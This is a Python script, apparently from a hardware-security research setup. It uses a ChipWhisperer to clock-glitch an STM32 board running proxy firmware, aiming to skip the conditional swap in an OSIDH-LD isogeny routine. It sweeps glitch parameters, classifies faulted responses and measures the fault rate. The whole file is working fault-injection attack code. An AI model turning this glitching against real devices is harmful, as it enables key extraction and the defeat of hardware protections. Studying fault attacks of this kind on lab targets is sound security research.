"""
cw_clock_glitch.py
------------------
Clock-glitch attack on the OSIDH-LD compare_gt / swap_vertices fault site.
Target: CWLITEARM (STM32F303RCT6, Cortex-M4 @ 7.37 MHz clkgen)

This drives the proxy firmware `target_osidh.c`, which isolates the single
fault-sensitive line of eval_action():

    digit_t b = compare_gt(t, s[i]);   //  0xFF..FF while t <= s[i]  (swap)
    swap_vertices(&R[0], &R[1], b);     //  pick the orientation trail

Attack goal
-----------
Force the swap NOT to happen when it should (t <= s_i).
Normally: b = 0xFF..FF  =>  swap happens  =>  target sends 0x01 (single mode)
Fault:    b = 0x00..00  =>  no swap       =>  target sends 0x00

Changes vs. the first draft (all bench-relevant):
  [1] route the glitch onto the target clock:  scope.io.hs2 = "glitch"
      (without this the glitch never reaches the STM32 and you get 0 faults).
  [2] sweep scope.glitch.ext_offset as well — offset/width only move the pulse
      inside one clock cycle; ext_offset chooses WHICH cycle (which instruction
      in the compare_gt/swap window).  scope.glitch.repeat is pinned to 1 for a
      clean single-instruction skip.
  [3] mode-aware result classification: in 'full' mode the correct answer is
      CYCLE_LENGTH (13), not 0x01; a single-slot skip is 12; 0 = all skipped.
  [4] fast reject via scope.adc.state (trigger never went low => still crashed),
      and reboot_flush() after the clock is reconfigured.

Usage
-----
    python3 cw_clock_glitch.py --phase coarse            # find hot params
    python3 cw_clock_glitch.py --phase fine  --ext 3 --offset -10 --width 14
    python3 cw_clock_glitch.py --phase demo  --ext 3 --offset -10 --width 14
"""

import chipwhisperer as cw
import pandas as pd
import time
import argparse
from datetime import datetime

# ---------------------------------------------------------------------------
# SimpleSerial commands (must match target_osidh.c, SimpleSerial v1.1)
# ---------------------------------------------------------------------------
CMD_SINGLE = 'g'   # single compare_gt test:  data = [t, s]
CMD_CYCLE  = 'c'   # full 13-slot cycle test: data = [t, s]
RESP_CMD   = 'r'

CYCLE_LENGTH = 13   # must match target firmware

# Test vector: t <= s  =>  swap SHOULD happen; we try to fault it away.
T_VAL = 1
S_VAL = 5

# single-mode result bytes
RESULT_CORRECT = 0x01   # swap happened (no fault)
RESULT_FAULTED = 0x00   # no swap      (fault succeeded)

# ---- sweep ranges (bench-reasonable defaults; widen as needed) ------------
EXT_OFFSET_RANGE = range(0, 11, 1)     # which clock cycle after the trigger
OFFSET_RANGE     = range(-20, 21, 2)   # glitch phase within a cycle (%)
WIDTH_RANGE      = range(6, 25, 2)     # glitch width (%)
REPS_COARSE = 3
REPS_FINE   = 50

TARGET_CLK_MHZ = 7.37
MAX_RESETS = 20

TIMESTAMP  = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_CSV = f"clock_glitch_results_{TIMESTAMP}.csv"


# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
def setup_scope_clock_glitch(scope):
    scope.default_setup()
    scope.clock.clkgen_freq = TARGET_CLK_MHZ * 1e6
    scope.clock.adc_src     = "clkgen_x1"

    # glitch module
    scope.glitch.clk_src     = "clkgen"
    scope.glitch.output      = "clock_xor"    # glitch_out = clk XOR glitch
    scope.glitch.trigger_src = "ext_single"   # one glitch per trigger pulse
    scope.glitch.repeat      = 1              # [2] single-instruction skip
    scope.glitch.ext_offset  = 0              # [2] swept below
    scope.glitch.offset      = -10
    scope.glitch.width       = 14

    # [1] CRITICAL: route the glitched clock onto the target clock line (HS2)
    scope.io.hs2 = "glitch"

    # trigger: rising edge on tio4 (trigger_high() in firmware)
    scope.trigger.triggers = "tio4"
    scope.adc.timeout = 0.1

    print(f"[setup] clock glitch @ {TARGET_CLK_MHZ} MHz, hs2=glitch, repeat=1")


def connect(port=None):
    scope = cw.scope()
    if port:
        target = cw.target(scope, cw.targets.SimpleSerial, port=port)
    else:
        target = cw.target(scope, cw.targets.SimpleSerial)
    setup_scope_clock_glitch(scope)
    time.sleep(0.1)
    reboot_flush(scope, target)               # [4] resync after clock change
    return scope, target


def reboot_flush(scope, target):
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)
    target.flush()


# ---------------------------------------------------------------------------
# Oracle
# ---------------------------------------------------------------------------
def classify(result, mode):
    """Map a response byte to 'correct' | 'faulted' | 'partial' | 'corrupt'."""
    if mode == 'single':
        if result == RESULT_CORRECT:
            return 'correct'
        if result == RESULT_FAULTED:
            return 'faulted'
        return 'corrupt'
    else:  # full cycle: correct=CYCLE_LENGTH, all-skipped=0, partial in between
        if result == CYCLE_LENGTH:
            return 'correct'
        if result == 0:
            return 'faulted'
        if 0 < result < CYCLE_LENGTH:
            return 'partial'
        return 'corrupt'


def query_target(scope, target, t_val=T_VAL, s_val=S_VAL, mode='single'):
    """Return (verdict, reset_flag). verdict in correct/faulted/partial/corrupt."""
    cmd = CMD_SINGLE if mode == 'single' else CMD_CYCLE
    scope.arm()
    try:
        target.simpleserial_write(cmd, bytearray([t_val, s_val]))
    except Exception:
        return 'corrupt', True

    ret = scope.capture()
    if ret:                                   # [4] timeout: trigger never fired
        reboot_flush(scope, target)
        return 'corrupt', True

    try:
        resp = target.simpleserial_read(RESP_CMD, 1, timeout=500)
        if not resp:
            reboot_flush(scope, target)
            return 'corrupt', True
        return classify(resp[0], mode), False
    except Exception:
        reboot_flush(scope, target)
        return 'corrupt', True


# ---------------------------------------------------------------------------
# Sweep
# ---------------------------------------------------------------------------
def run_coarse_sweep(scope, target, mode='single'):
    results, consecutive_resets = [], 0
    total = len(EXT_OFFSET_RANGE) * len(OFFSET_RANGE) * len(WIDTH_RANGE)
    print(f"[coarse] {total} (ext,offset,width) points x {REPS_COARSE} reps "
          f"= {total * REPS_COARSE} queries, mode={mode}")

    for ext in EXT_OFFSET_RANGE:
        scope.glitch.ext_offset = ext
        for offset in OFFSET_RANGE:
            for width in WIDTH_RANGE:
                scope.glitch.offset = offset
                scope.glitch.width  = width

                n = dict(correct=0, faulted=0, partial=0, corrupt=0)
                for _ in range(REPS_COARSE):
                    verdict, reset = query_target(scope, target, mode=mode)
                    n[verdict] += 1
                    if reset:
                        consecutive_resets += 1
                        if consecutive_resets >= MAX_RESETS:
                            print(f"[!] {MAX_RESETS} consecutive resets, aborting.")
                            return pd.DataFrame(results)
                    else:
                        consecutive_resets = 0

                fault_rate = n['faulted'] / REPS_COARSE
                results.append(dict(ext_offset=ext, offset=offset, width=width,
                                    **n, fault_rate=fault_rate))
                if n['faulted'] > 0:
                    print(f"  [HIT] ext={ext:3d} offset={offset:4d} width={width:3d}"
                          f"  faulted={n['faulted']}/{REPS_COARSE}"
                          f"  ({fault_rate*100:.0f}%)")

    df = pd.DataFrame(results)
    df.to_csv(OUTPUT_CSV, index=False)
    print(f"[coarse] saved -> {OUTPUT_CSV}")
    return df


def run_fine(scope, target, ext, offset, width, mode='single'):
    scope.glitch.ext_offset = ext
    scope.glitch.offset = offset
    scope.glitch.width  = width
    n = dict(correct=0, faulted=0, partial=0, corrupt=0)
    for _ in range(REPS_FINE):
        verdict, _ = query_target(scope, target, mode=mode)
        n[verdict] += 1
    p = n['faulted'] / REPS_FINE
    print(f"[fine] ext={ext} offset={offset} width={width} mode={mode}")
    print(f"       {n}  ->  measured fault probability p = {p:.4f}")
    print(f"       feed this into:  python3 ../analysis/osidh_fault_eval.py --p {p:.4f}")
    return p


# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Clock-glitch attack on OSIDH-LD / CWLITEARM")
    ap.add_argument("--port", default=None)
    ap.add_argument("--mode", choices=["single", "full"], default="single")
    ap.add_argument("--phase", choices=["coarse", "fine", "demo"], default="coarse")
    ap.add_argument("--ext",    type=int, default=3)
    ap.add_argument("--offset", type=int, default=-10)
    ap.add_argument("--width",  type=int, default=14)
    args = ap.parse_args()

    print("=" * 60)
    print(f"OSIDH-LD Clock Glitch — CWLITEARM   mode={args.mode} phase={args.phase}")
    print("=" * 60)
    scope, target = connect(args.port)

    try:
        if args.phase == "coarse":
            df = run_coarse_sweep(scope, target, mode=args.mode)
            hot = df[df["fault_rate"] > 0]
            print(f"\n[summary] {len(hot)} hot points")
            if len(hot):
                cols = ["ext_offset", "offset", "width", "faulted", "fault_rate"]
                print(df.nlargest(10, "fault_rate")[cols].to_string(index=False))
        elif args.phase == "fine":
            run_fine(scope, target, args.ext, args.offset, args.width, mode=args.mode)
        elif args.phase == "demo":
            scope.glitch.ext_offset = args.ext
            scope.glitch.offset = args.offset
            scope.glitch.width  = args.width
            n_faulted = 0
            for i in range(100):
                verdict, _ = query_target(scope, target, t_val=1, s_val=5, mode="single")
                if verdict == 'faulted':
                    n_faulted += 1
                    print(f"  [!] fault at attempt {i+1}")
            print(f"\n[demo] {n_faulted}/100 faults ({n_faulted}% success)")
    finally:
        scope.dis()
        target.dis()
        print("\n[done] disconnected.")


if __name__ == "__main__":
    main()
